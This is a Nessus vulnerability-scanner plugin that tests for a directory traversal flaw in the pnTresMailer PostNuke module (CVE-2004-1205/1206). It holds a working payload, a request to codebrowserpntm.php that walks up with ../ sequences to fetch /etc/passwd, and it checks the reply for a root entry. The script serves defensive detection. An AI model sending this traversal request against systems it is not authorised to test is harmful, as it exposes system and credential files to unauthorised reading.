#
# (C) Tenable Network Security
#


if (description)
{
 script_id(15858);
 script_bugtraq_id(11767);
 script_cve_id("CVE-2004-1205", "CVE-2004-1206");
 script_version("$Revision: 1.4 $");

 script_name(english:"Post-Nuke pnTresMailer Directory Traversal");
 desc["english"] = "
The remote host is running a version of the pnTresMailer PostNuke module
which is vulnerable to a directory traversal attack.

An attacker may use this flaw to read arbitrary files on the remote
web server, with the privileges of the web server process.

Solution : Upgrade to the latest version of this module
Risk factor : Medium";

 script_description(english:desc["english"]);
 script_summary(english:"Determines if pnTresMailer is vulnerable to a Directory Traversal");
 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses", francais:"Abus de CGI");
 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
 script_dependencie("postnuke_detect.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);

kb = get_kb_item("www/" + port + "/postnuke" );
if ( ! kb ) exit(0);
stuff = eregmatch(pattern:"(.*) under (.*)", string:kb );
dir = stuff[2];


if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

req = http_get(item:string(dir, "/codebrowserpntm.php?downloadfolder=pnTresMailer&filetodownload=../../../../../../../../../../../etc/passwd"), port:port);
res = http_keepalive_send_recv(port:port, data:req);
if(res == NULL ) exit(0);
 
if ( egrep(pattern:"root:.*:0:[01]:.*", string:res) ) 
	security_warning ( port );
